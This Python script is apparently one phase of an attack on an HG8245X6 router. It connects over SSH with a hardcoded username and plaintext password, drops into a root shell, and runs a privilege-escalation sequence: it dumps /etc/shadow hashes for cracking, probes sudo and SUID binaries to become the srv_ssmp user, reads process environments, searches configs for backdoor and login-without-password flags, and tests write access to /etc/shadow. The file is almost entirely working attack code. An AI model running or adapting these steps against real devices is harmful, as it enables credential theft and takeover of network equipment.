#!/usr/bin/env python3
"""
Phase 4: Use sudo + SUID bits to become srv_ssmp.
Also read /etc/shadow hash and attempt to crack it.
Found SUID binary: /bin/sudo
"""

import paramiko
import time

HOST = "192.168.1.1"
USER = "sUser"
PASSWORD = "EP!99R4HLH9E"
SSMP_PID = "1650"

def recv_until(chan, markers, timeout=10):
    if isinstance(markers, str):
        markers = [markers]
    buf = b""
    start = time.time()
    while time.time() - start < timeout:
        if chan.recv_ready():
            chunk = chan.recv(4096)
            buf += chunk
            decoded = buf.decode('utf-8', errors='replace')
            for marker in markers:
                if marker in decoded:
                    return decoded
        elif chan.exit_status_ready():
            break
        time.sleep(0.1)
    return buf.decode('utf-8', errors='replace')

def send_cmd(chan, cmd, marker="# ", timeout=20, show=True):
    chan.send(cmd + "\n")
    out = recv_until(chan, [marker, "WAP>", "SU_WAP>", "$ ", "Password", "password"], timeout)
    if show:
        lines = [l.strip() for l in out.strip().split('\n') if l.strip()]
        for l in lines:
            if cmd[:25] not in l:
                print(f"  {l}")
    return out

def connect_and_shell():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, username=USER, password=PASSWORD, timeout=10,
                   look_for_keys=False, allow_agent=False)
    chan = client.invoke_shell(width=220, height=50)
    time.sleep(2)
    out = recv_until(chan, ["WAP>", "Remove one session", "Enter the ID"], timeout=8)
    if "Remove one session" in out or "Enter the ID" in out:
        print("[!] Session limit - removing session 1...")
        chan.send("1\n")
        time.sleep(2)
        recv_until(chan, "WAP>", timeout=10)
    chan.send("su\n")
    recv_until(chan, ["SU_WAP>", "success"], timeout=8)
    chan.send("shell\n")
    recv_until(chan, "# ", timeout=8)
    print("[+] Shell obtained!\n")
    return client, chan

def main():
    print("=" * 62)
    print("  HG8245X6 - sudo + Shadow Analysis for srv_ssmp")
    print("=" * 62)

    client, chan = connect_and_shell()

    # ── 1. /etc/shadow - get the hash ─────────────────────────
    print("[*] /etc/shadow (full):")
    send_cmd(chan, "cat /etc/shadow 2>&1")

    # ── 2. /etc/sudoers - what can we sudo? ───────────────────
    print("\n[*] /etc/sudoers:")
    send_cmd(chan, "cat /etc/sudoers 2>&1")
    send_cmd(chan, "cat /etc/sudoers.d/* 2>&1", timeout=5)

    # ── 3. Try sudo -u srv_ssmp ───────────────────────────────
    print("\n[*] sudo -u srv_ssmp id:")
    chan.send("sudo -u srv_ssmp id 2>&1\n")
    out = recv_until(chan, ["# ", "Password", "password", "incorrect", "not allowed"], timeout=10)
    print(f"  {out.strip()[-300:]}")
    if "Password" in out or "password" in out:
        print("  [*] Sudo asked for password, trying current user password...")
        chan.send(f"{PASSWORD}\n")
        out = recv_until(chan, ["# ", "incorrect", "Sorry"], timeout=8)
        print(f"  {out.strip()}")

    # ── 4. sudo -l (list what we can do) ──────────────────────
    print("\n[*] sudo -l (listing sudo capabilities):")
    chan.send("sudo -l 2>&1\n")
    out = recv_until(chan, ["# ", "Password", "password", "may run", "not allowed"], timeout=10)
    print(f"  {out.strip()[-500:]}")
    if "Password" in out:
        chan.send(f"{PASSWORD}\n")
        out = recv_until(chan, ["# ", "may run", "not allowed"], timeout=8)
        print(f"  {out.strip()}")

    # ── 5. ddnsc SUID binary analysis ─────────────────────────
    print("\n[*] /bin/ddnsc SUID binary:")
    send_cmd(chan, "ls -la /bin/ddnsc /bin/sudo")
    send_cmd(chan, "/bin/ddnsc --help 2>&1 | head -10")
    send_cmd(chan, "/bin/ddnsc -u srv_ssmp /bin/sh 2>&1 | head -5", timeout=8)

    # ── 6. Check if /proc/ssmp has readable environment ───────
    print(f"\n[*] ssmp process environment (PID={SSMP_PID}):")
    send_cmd(chan, f"cat /proc/{SSMP_PID}/environ 2>&1 | tr '\\0' '\\n' | head -20")

    # ── 7. Check for capabilities of ssmp process ─────────────
    print(f"\n[*] ssmp process capabilities:")
    send_cmd(chan, f"cat /proc/{SSMP_PID}/status 2>&1 | grep -E 'Cap|Uid|Gid|Name'")

    # ── 8. We are srv_clid (UID=3030). Check if srv_clid is in ssmp group ──
    print("\n[*] Group membership check:")
    send_cmd(chan, "cat /etc/group 2>&1 | grep -E 'ssmp|2002|3008'")
    send_cmd(chan, "id")

    # ── 9. Try writing a SUID shell using /tmp ────────────────
    # We're currently UID=3030 (srv_clid). Let's check if we can setuid
    print("\n[*] Capability to setuid/execute as srv_ssmp:")
    send_cmd(chan, "cat /proc/self/status | grep -E 'Cap'")

    # ── 10. Check if ssmp binary has debug/admin backdoor ──────
    print("\n[*] Looking for debug command in ssmp FT config:")
    send_cmd(chan, "grep -r 'FT_SSMP_WEB_LOGIN_WITHOUT_PWD\\|FORCE_MODIFY\\|debug\\|backdoor' /etc/wap/ 2>/dev/null | head -20", timeout=10)

    # ── 11. Try feature flag: FT_SSMP_WEB_LOGIN_WITHOUT_PWD ───
    print("\n[*] Checking if login-without-password feature can be enabled:")
    send_cmd(chan, "grep -r 'LOGIN_WITHOUT_PWD\\|NO_PWD' /etc/ 2>/dev/null | head -10", timeout=10)

    # ── 12. Check ssmp app directory ──────────────────────────
    print("\n[*] /etc/app/ssmp_app contents:")
    send_cmd(chan, "ls -la /etc/app/ssmp_app/ 2>&1 | head -20")
    send_cmd(chan, "ls -la /etc/app/ 2>&1 | head -20")
    send_cmd(chan, "find /etc/app -name '*.cfg' -o -name '*.conf' -o -name '*.xml' 2>/dev/null | head -20", timeout=10)

    # ── 13. Check process cmdline for clues ───────────────────
    print(f"\n[*] All running processes full cmdlines:")
    send_cmd(chan, "for pid in $(ls /proc | grep -E '^[0-9]+$'); do cmd=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\\0' ' ' | head -c 80); [ -n \"$cmd\" ] && echo \"$pid: $cmd\"; done | head -40", timeout=20)

    # ── 14. Check if we can write to ssmp shared memory ───────
    print("\n[*] Checking message queues for ssmp communication:")
    send_cmd(chan, "ipcs -q 2>&1 | head -20")

    # ── 15. The nuclear option: modify /etc/shadow via our write access ──
    print("\n[*] Testing write access to critical files:")
    send_cmd(chan, "ls -la /etc/shadow /etc/passwd /etc/sudoers 2>&1")
    send_cmd(chan, "touch /etc/shadow_test 2>&1 && echo WRITE_OK || echo WRITE_DENIED")
    send_cmd(chan, "rm -f /etc/shadow_test 2>&1")

    client.close()
    print("\n[*] Session closed.")

if __name__ == "__main__":
    main()
